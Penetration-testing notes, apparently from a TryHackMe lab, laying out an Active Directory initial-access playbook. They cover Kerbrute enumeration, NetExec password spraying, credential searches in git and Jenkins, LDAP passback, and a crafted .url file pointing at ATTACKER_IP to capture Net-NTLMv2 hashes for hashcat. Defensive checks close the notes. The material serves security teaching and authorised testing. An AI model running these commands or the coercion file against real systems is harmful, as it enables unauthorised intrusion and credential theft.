

# Active Directory Breaching — Engagement Notes

## 1. Objective

**AD breaching** is the process of obtaining the first valid Active Directory credential from an unauthenticated starting position.

Once valid credentials are obtained, they can be used for:

* Domain enumeration
* SMB/LDAP/WinRM/RDP access
* Credential discovery
* Lateral movement
* Privilege escalation
* Access to higher-value systems and accounts

### Starting Positions

| Position                    | Description                                           |
| --------------------------- | ----------------------------------------------------- |
| Unauthenticated / Black-box | Network access but no valid AD credentials            |
| Authenticated / Grey-box    | Already possess a valid low-privileged domain account |

---

# 2. Initial AD Attack Surface

Common services to enumerate:

| Service    |   Port | Relevance                                             |
| ---------- | -----: | ----------------------------------------------------- |
| DNS        |     53 | Domain infrastructure discovery                       |
| Kerberos   |     88 | Username enumeration / authentication                 |
| LDAP       |    389 | Directory queries                                     |
| LDAPS      |    636 | Encrypted LDAP                                        |
| SMB        |    445 | Shares, authentication, administration                |
| HTTP/HTTPS | 80/443 | Internal portals, Git, Jenkins, management interfaces |

---

# 3. OSINT & Username Enumeration

## Objective

Build a list of potential domain usernames before attempting authentication.

Potential sources:

* Corporate websites
* LinkedIn
* GitHub/GitLab
* Job advertisements
* Public breach data
* Public documentation

Common username formats:

```text
first.last
firstlast
flast
first.l
first
last.first
```

Example:

```text
Jane Smith

jane.smith
janesmith
jsmith
jane.s
jane
smith.jane
```

---

## Kerberos Username Enumeration

**Tool:** Kerbrute

Kerberos behaves differently for valid and invalid usernames, allowing account existence to be identified without knowing the password.

Example:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt
```

Save results:

```bash
kerbrute userenum -d thm.loc --dc 192.168.12.100 /root/usernames.txt -o valid_users.txt
```

Look for:

```text
[+] VALID USERNAME: username@domain
```

### Important

Kerberos username enumeration generally does **not** count as a failed password authentication attempt and therefore does not normally trigger account lockouts.

However, authentication requests generate Windows event telemetry, including **Event ID 4768**, so this activity is not invisible.

---

# 4. DNS Enumeration

DNS is fundamental to AD because important infrastructure is registered through DNS.

### Domain Controllers

```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.thm.loc 192.168.12.100
```

### Kerberos

```bash
nslookup -type=SRV _kerberos._tcp.thm.loc 192.168.12.100
```

### Mail Servers

```bash
nslookup -type=MX thm.loc 192.168.12.100
```

### Engagement Notes

Record:

```text
Domain:
Domain Controller:
Kerberos KDC:
DNS:
Mail server:
Other discovered hosts:
```

---

# 5. Credential Discovery

Credentials may be exposed through:

* Git repositories
* Git history
* Jenkins
* CI/CD pipelines
* Configuration files
* Network shares
* Internal documentation
* LDAP configurations
* SNMP configurations
* Source code
* Environment variables
* Build logs

MITRE ATT&CK:

```text
T1552 — Unsecured Credentials
```

---

## Git

Check:

* Current source
* Commit history
* Configuration files
* `.env`
* CI/CD definitions
* Hardcoded credentials

Manual search:

```bash
git log -p | grep -i "password\|secret\|token\|key\|credential"
```

Automated:

```bash
trufflehog git file:///path/to/repo
```

### Important

Deleting a secret from the latest commit does **not** remove it from Git history.

---

# 6. Jenkins Credential Discovery

Potential locations:

* Build console output
* Job configuration
* `config.xml`
* Environment variables
* Workspace files
* Deployment scripts
* Build artifacts

Example:

```bash
curl http://ci.thm.loc/job/JOB_NAME/lastBuild/consoleText | grep -i "password\|secret\|token\|credential"
```

Look for:

```text
username
password
token
API key
connection string
service account
deployment credential
```

---

# 7. Password Spraying

## Brute Force vs Password Spray

### Brute Force

One account:

```text
user → password1
user → password2
user → password3
...
```

High risk of account lockout.

### Password Spraying

One password across many accounts:

```text
user1 → password
user2 → password
user3 → password
...
```

Then move to the next password after an appropriate interval.

---

# 8. Determine Lockout Policy

If valid credentials are already available:

```bash
nxc smb 192.168.12.100 -u 'validuser' -p 'validpassword' --pass-pol
```

Record:

```text
Minimum password length:
Password history:
Lockout threshold:
Reset counter:
Lockout duration:
Password complexity:
```

### Operational Rule

Never blindly spray.

If:

```text
STATUS_ACCOUNT_LOCKED_OUT
```

appears, **stop** and reassess.

---

# 9. NetExec Password Spray

Clean Kerbrute output:

```bash
grep "VALID USERNAME" valid_users.txt | \
awk '{print $NF}' | \
sed 's/@thm.loc//' > clean_users.txt
```

Spray one password:

```bash
nxc smb 192.168.12.100 \
-u clean_users.txt \
-p 'MegaCorp01!' \
--continue-on-success
```

Optional jitter:

```bash
nxc smb 192.168.12.100 \
-u clean_users.txt \
-p 'MegaCorp01!' \
--continue-on-success \
--jitter 2-5
```

### Important Results

```text
[+]                       Valid credentials
STATUS_LOGON_FAILURE      Incorrect password
STATUS_ACCOUNT_DISABLED   Account disabled
STATUS_ACCOUNT_LOCKED_OUT Stop spraying
(Pwn3d!)                  Local administrator access
```

---

# 10. Authentication Coercion

MITRE ATT&CK:

```text
T1187 — Forced Authentication
```

Instead of discovering or guessing credentials, coercion attempts to make a victim system authenticate to infrastructure controlled by the tester.

Two covered techniques:

1. LDAP passback
2. File-based coercion

---

# 11. LDAP Passback

### Attack Concept

A network device such as a:

* Printer
* Scanner
* MFP
* IoT device

may contain LDAP credentials.

If the device uses plaintext LDAP, its LDAP connection can potentially be redirected to a tester-controlled listener.

### Attack Flow

```text
Access device admin panel
        ↓
Find LDAP configuration
        ↓
Replace LDAP server with tester IP
        ↓
Start listener
        ↓
Trigger "Test Connection"
        ↓
Capture LDAP credentials
        ↓
Validate credentials
```

Potential weaknesses:

* Default administrator credentials
* Weak device credentials
* Plaintext LDAP
* Overprivileged LDAP service account
* Long-lived service-account passwords

Example listener:

```bash
nc -lvnp 3489
```

The captured data may contain:

```text
DN / username
plaintext password
```

Validate obtained credentials:

```bash
nxc smb 192.168.12.100 -u 'svc.ldap' -p 'CAPTURED_PASSWORD'
```

### Limitation

If the device uses:

* LDAPS
* TLS
* SASL

a simple Netcat listener may not expose plaintext credentials.

---

# 12. File-Based Coercion

A writable SMB share can sometimes be abused to trigger Windows authentication.

A crafted `.url` file can reference an external UNC path:

```text
\\ATTACKER_IP\share\icon.ico
```

When Windows Explorer renders the file, it may attempt SMB authentication to the referenced host.

The resulting authentication material can contain a **Net-NTLMv2** challenge-response.

### Example `.url`

```ini
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\ATTACKER_IP\icons\icon.ico
IconIndex=1
```

The leading `@` in:

```text
@Shortcut.url
```

can make the file appear near the top of a directory listing.

---

# 13. Responder

Start Responder on the appropriate interface:

```bash
sudo responder -I tun0
```

Place the crafted file on the writable SMB share.

Example:

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice.moore%PASSWORD'
```

Then:

```text
put @Shortcut.url
```

When a victim accesses the share, monitor Responder for:

```text
NTLMv2-SSP Username
NTLMv2-SSP Hash
```

---

# 14. Net-NTLMv2 Hashes

Important distinction:

**LDAP passback**

```text
Potential plaintext credential
```

**File-based coercion**

```text
Net-NTLMv2 challenge-response
```

A Net-NTLMv2 hash is **not equivalent to a reusable NTLM password hash**.

It generally needs to be:

* Cracked offline, or
* Used in an appropriate relay scenario where conditions permit

---

# 15. Offline Cracking

Hashcat mode for Net-NTLMv2:

```text
5600
```

Example:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Successful cracking produces the plaintext password, which can then be validated against the appropriate AD service.

---

# 16. Advanced Coercion — Awareness

Additional techniques to research when appropriate:

```text
PetitPotam
PrinterBug / SpoolSample
DFSCoerce
```

These can potentially force high-value Windows systems to authenticate to attacker-controlled infrastructure.

Combined with relay attacks, coercion can form significant AD attack chains.

---

# 17. Engagement Workflow

### Phase 1 — Recon

```text
Identify domain
Identify DCs
Identify DNS
Identify SMB
Identify LDAP
Identify Kerberos
Identify HTTP/HTTPS
```

### Phase 2 — Username Discovery

```text
OSINT
    ↓
Username formats
    ↓
Username wordlist
    ↓
Kerbrute
    ↓
Validated accounts
```

### Phase 3 — Credential Discovery

```text
Git
Jenkins
SMB shares
Configuration files
Documentation
Device interfaces
```

### Phase 4 — Credential Validation

```text
NetExec
SMB
LDAP
WinRM
RDP
MSSQL
```

### Phase 5 — Password Spraying

```text
Determine lockout policy
        ↓
Select candidate password
        ↓
Spray one password
        ↓
Monitor results
        ↓
Stop if lockouts appear
```

### Phase 6 — Coercion

```text
Identify writable shares / vulnerable devices
        ↓
LDAP passback OR file-based coercion
        ↓
Capture authentication material
        ↓
Crack or relay where appropriate
        ↓
Validate recovered credentials
```

---

# 18. Defensive Checks

## Secrets

* Use a dedicated secrets manager.
* Scan repositories with secret-detection tooling.
* Audit Git history.
* Rotate exposed credentials.
* Prevent secrets from appearing in CI/CD logs.

## Passwords

* Use long passwords.
* Block common and organisation-specific passwords.
* Avoid shared default passwords.
* Configure sensible lockout policies.
* Monitor distributed authentication failures.

## Network Devices

* Change default credentials.
* Prefer LDAPS over plaintext LDAP.
* Restrict device management interfaces.
* Use dedicated low-privilege service accounts.
* Rotate service-account credentials.

## SMB / File Shares

* Apply least privilege.
* Minimise unnecessary write access.
* Monitor suspicious files such as `.url`, `.lnk`, `.scf`, and `desktop.ini`.
* Monitor unusual SMB authentication patterns.

## NTLM

* Disable NTLMv1.
* Prefer NTLMv2 where NTLM remains necessary.
* Enforce SMB signing.
* Restrict outbound SMB traffic.
* Plan migration away from NTLM where possible.

## Segmentation

Restrict access to:

* Domain controllers
* Jenkins
* Git servers
* Printer administration
* Management interfaces
* Other sensitive internal services

Use:

```text
VLAN segmentation
Firewall ACLs
MFA
Management networks
Least privilege
```

---

# Quick Engagement Checklist

```text
[ ] Identify domain
[ ] Identify DC
[ ] Identify DNS
[ ] Enumerate SMB
[ ] Enumerate LDAP
[ ] Enumerate Kerberos
[ ] Identify web services
[ ] Collect username candidates
[ ] Validate usernames with Kerberos
[ ] Search Git repositories
[ ] Search Jenkins
[ ] Check exposed configuration files
[ ] Check network shares
[ ] Identify credential leaks
[ ] Determine password policy
[ ] Perform controlled password spraying
[ ] Check printer/device LDAP configuration
[ ] Check writable SMB shares
[ ] Assess authentication coercion
[ ] Capture Net-NTLMv2 where authorised
[ ] Crack/relay where appropriate
[ ] Validate obtained credentials
[ ] Document every credential and access path
```

This is now structured as a reusable **AD initial-access/breaching playbook**, rather than just raw room notes.

